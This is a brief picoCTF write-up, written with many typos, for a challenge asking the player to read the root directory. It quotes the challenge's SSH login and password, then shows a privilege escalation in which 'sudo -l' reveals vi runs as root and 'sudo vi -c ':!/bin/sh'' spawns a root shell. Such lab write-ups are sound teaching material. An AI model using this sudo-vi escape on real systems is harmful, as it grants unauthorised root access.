## Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 49962 picoplayer@saturn.picoctf.net Password: yX-YQgX-vS Can you login and read the root file?

For this we need to get some permissions or to find a way to reed the root direotry. The way I did it was by escalidating privilage. 

First, let's see what we can run as root. Fot that we run: 

```console

sudo -l

```

We see that we can run vi as root. There is a short command for running a shell throu vi:

```console

sudo vi -c ':!/bin/sh' /dev/null

```
With this we can go to root directory

```console

cd /root

ls -a

```
And you will find the flag in all its glory.
